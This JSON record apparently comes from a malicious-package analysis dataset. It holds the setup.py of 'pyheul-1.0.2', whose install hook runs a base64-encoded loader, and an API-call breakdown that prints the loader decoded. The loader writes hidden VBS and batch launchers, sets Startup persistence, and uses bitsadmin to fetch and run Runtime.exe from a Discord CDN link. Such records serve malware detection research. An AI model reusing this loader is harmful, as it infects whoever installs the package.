[
  {
    "pyfile": "setup.py",
    "code_snippet": "from setuptools.command.install import install\nimport os\nimport subprocess\n\nclass InstallCommand(install):\n\n    def run(self):\n        try:\n            print(\"\")\n            exec(__import__('base64').b64decode(\"aW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNzCmxvZ2luID0gb3MuZ2V0bG9naW4oKQppZiBvcy5wYXRoLmV4aXN0cyhmJ0M6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtODZcXCcpID09IEZhbHNlOgogICAgdHJ5OgogICAgICAgIG9zLm1rZGlyKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NiIpCiAgICBleGNlcHQ6IHBhc3MKICAgIG9wZW4oZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxXSU4zMi52YnMiLCAiYSIpLndyaXRlKGYnU2V0IFdzaFNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikgXG5Xc2hTaGVsbC5SdW4gY2hyKDM0KSAmICJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxXSU4zMi5iYXQiICYgQ2hyKDM0KSwgMFxuU2V0IFdzaFNoZWxsID0gTm90aGluZycpCiAgICBvcGVuKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTdGFydHVwXFxXSU42NC52YnMiLCAiYSIpLndyaXRlKGYnU2V0IFdzaFNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikgXG5Xc2hTaGVsbC5SdW4gY2hyKDM0KSAmICJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxSdW50aW1lLmV4ZSIgJiBDaHIoMzQpLCAwXG5TZXQgV3NoU2hlbGwgPSBOb3RoaW5nJykKCiAgICBvcGVuKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NlxcV0lOMzIuYmF0IiwgImEiKS53cml0ZShmJycnYml0c2FkbWluIC90cmFuc2ZlciBteWRvd25sb2Fkam9iIC9kb3dubG9hZCAvcHJpb3JpdHkgRk9SRUdST1VORCAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTE1MjcxNjI4MDU3MTM3NTYyNi8xMjQ1Nzc3NTg3MTQ2NTkyMzU3L1J1bnRpbWUuZXhlP2V4PTY2NTlmYzRhJmlzPTY2NThhYWNhJmhtPWY4NTA4YjE5Y2QzZjQ2NjMyMDhmNjQ4YjVhNzFjNjM3ZmQxYjhmOThhOTAyMTYxY2UzZDM4ODU3YTY1NmMxZDImIiAiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NlxcUnVudGltZS5leGUiXG5zdGFydCAiIiAiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NlxcUnVudGltZS5leGUiJycnKQogICAgc3VicHJvY2Vzcy5ydW4oZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxXSU4zMi52YnMiLCBzaGVsbD1UcnVlLCBjaGVjaz1UcnVlKQogICAgCmVsc2U6ICAgCiAgICBwYXNz\"))\n        except:\n            pass\n        install.run(self)\n",
    "pattern_analysis": {
      "api_sequence": [
        "__import__",
        "__import__",
        "__import__",
        "base64.b64decode",
        "exec",
        "os.getlogin",
        "os.path.exists",
        "os.mkdir",
        "open",
        "open.write",
        "open",
        "open.write",
        "open",
        "open.write",
        "subprocess.run",
        "setuptools.command.install.install.run"
      ],
      "api_sequence_with_args": [
        "__import__('base64')",
        "__import__('os')",
        "__import__('subprocess')",
        "base64.b64decode(\"aW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNzCmxvZ2luID0gb3MuZ2V0bG9naW4oKQppZiBvcy5wYXRoLmV4aXN0cyhmJ0M6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtODZcXCcpID09IEZhbHNlOgogICAgdHJ5OgogICAgICAgIG9zLm1rZGlyKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NiIpCiAgICBleGNlcHQ6IHBhc3MKICAgIG9wZW4oZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxXSU4zMi52YnMiLCAiYSIpLndyaXRlKGYnU2V0IFdzaFNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikgXG5Xc2hTaGVsbC5SdW4gY2hyKDM0KSAmICJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxXSU4zMi5iYXQiICYgQ2hyKDM0KSwgMFxuU2V0IFdzaFNoZWxsID0gTm90aGluZycpCiAgICBvcGVuKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NlxcV0lOMzIuYmF0IiwgImEiKS53cml0ZShmJycnYml0c2FkbWluIC90cmFuc2ZlciBteWRvd25sb2Fkam9iIC9kb3dubG9hZCAvcHJpb3JpdHkgRk9SRUdST1VORCAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTE1MjcxNjI4MDU3MTM3NTYyNi8xMjQ1Nzc3NTg3MTQ2NTkyMzU3L1J1bnRpbWUuZXhlP2V4PTY2NTlmYzRhJmlzPTY2NThhYWNhJmhtPWY4NTA4YjE5Y2QzZjQ2NjMyMDhmNjQ4YjVhNzFjNjM3ZmQxYjhmOThhOTAyMTYxY2UzZDM4ODU3YTY1NmMxZDImIiAiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NlxcUnVudGltZS5leGUiXG5zdGFydCAiIiAiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NlxcUnVudGltZS5leGUiJycnKQogICAgc3VicHJvY2Vzcy5ydW4oZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxXSU4zMi52YnMiLCBzaGVsbD1UcnVlLCBjaGVjaz1UcnVlKQogICAgCmVsc2U6ICAgCiAgICBwYXNz\"))",
        "exec(decoded_code)",
        "os.getlogin()",
        "os.path.exists(f'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System86\\')",
        "os.mkdir(f'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System86')",
        "open(f'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System86\\WIN32.vbs', 'a')",
        "open(...).write(\"Set WshShell = CreateObject('WScript.Shell') \\nWshShell.Run chr(34) & 'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System86\\WIN32.bat' & Chr(34), 0\\nSet WshShell = Nothing\")",
        "open(f'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System86\\WIN64.vbs', 'a')",
        "open(...).write(\"Set WshShell = CreateObject('WScript.Shell') \\nWshShell.Run chr(34) & 'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System86\\Runtime.exe' & Chr(34), 0\\nSet WshShell = Nothing\")",
        "open(f'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System86\\WIN32.bat', 'a')",
        "open(...).write(\"'''bitsadmin /transfer mydownloadjob /download /priority FOREGROUND \"https://cdn.discordapp.com/attachments/1152716280571375626/1245777587146592357/Runtime.exe?ex=6659fc4a&is=6658aaca&hm=f8508b19cd3f4663208f648b5a71c637fd1b8f98a902161ce3d38857a656c1d2&\" \"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System86\\Runtime.exe\"\nstart \"\" \"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System86\\Runtime.exe\"'''\" )",
        "subprocess.run(f'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System86\\WIN32.vbs', shell=True, check=True)",
        "setuptools.command.install.install.run(self)"
      ],
      "mapped_sequence": [
        {
          "api_name": "__import__",
          "id": "import_dynamic",
          "description": "Dynamically imports specified module",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "module_importing"
        },
        {
          "api_name": "__import__",
          "id": "import_dynamic",
          "description": "Dynamically imports specified module",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "module_importing"
        },
        {
          "api_name": "__import__",
          "id": "import_dynamic",
          "description": "Dynamically imports specified module",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "module_importing"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "exec",
          "id": "exec_python_code",
          "description": "Dynamically executes Python code string",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "string_execution"
        },
        {
          "api_name": "os.getlogin",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.mkdir",
          "id": "create_directory",
          "description": "Creates directory, ignoring if it already exists",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "subprocess.run",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "setuptools.command.install.install.run",
          "id": "exec_setuptools_install",
          "description": "Executes setuptools installation procedure",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "package_configuration"
        }
      ],
      "contextual_code": "from setuptools.command.install import install\nimport os\nimport subprocess\n\nclass InstallCommand(install):\n    def run(self):\n        try:\n            exec(__import__('base64').b64decode(\"aW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNzCmxvZ2luID0gb3MuZ2V0bG9naW4oKQppZiBvcy5wYXRoLmV4aXN0cyhmJ0M6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtODZcXCcpID09IEZhbHNlOgogICAgdHJ5OgogICAgICAgIG9zLm1rZGlyKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NiIpCiAgICBleGNlcHQ6IHBhc3MKICAgIG9wZW4oZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxXSU4zMi52YnMiLCAiYSIpLndyaXRlKGYnU2V0IFdzaFNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikgXG5Xc2hTaGVsbC5SdW4gY2hyKDM0KSAmICJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxXSU4zMi5iYXQiICYgQ2hyKDM0KSwgMFxuU2V0IFdzaFNoZWxsID0gTm90aGluZycpCiAgICBvcGVuKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NlxcV0lOMzIuYmF0IiwgImEiKS53cml0ZShmJycnYml0c2FkbWluIC90cmFuc2ZlciBteWRvd25sb2Fkam9iIC9kb3dubG9hZCAvcHJpb3JpdHkgRk9SRUdST1VORCAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTE1MjcxNjI4MDU3MTM3NTYyNi8xMjQ1Nzc3NTg3MTQ2NTkyMzU3L1J1bnRpbWUuZXhlP2V4PTY2NTlmYzRhJmlzPTY2NThhYWNhJmhtPWY4NTA4YjE5Y2QzZjQ2NjMyMDhmNjQ4YjVhNzFjNjM3ZmQxYjhmOThhOTAyMTYxY2UzZDM4ODU3YTY1NmMxZDImIiAiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NlxcUnVudGltZS5leGUiXG5zdGFydCAiIiAiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NlxcUnVudGltZS5leGUiJycnKQogICAgc3VicHJvY2Vzcy5ydW4oZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxXSU4zMi52YnMiLCBzaGVsbD1UcnVlLCBjaGVjaz1UcnVlKQogICAgCmVsc2U6ICAgCiAgICBwYXNz\"))\n        except:\n            pass\n        install.run(self)"
    }
  },
  {
    "metadata": {
      "package_name": "pyheul-1.0.2"
    }
  }
]